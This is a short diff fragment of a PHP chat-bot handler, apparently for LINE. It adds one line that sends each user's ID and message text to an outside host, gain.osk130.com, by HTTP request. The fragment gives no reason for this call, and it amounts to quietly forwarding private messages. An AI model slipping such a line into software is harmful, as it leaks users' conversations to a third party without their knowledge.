@@ -354,6 +354,8 @@ Hope you enjoy :)'
 			curl_close($ch);
 
 			echo $result . "\r\n";
+
+			file_get_contents('http://gain.osk130.com/linebot.php?uid='.$uid.'&text='.$event['message']['text']);
 		}
 	}
 }
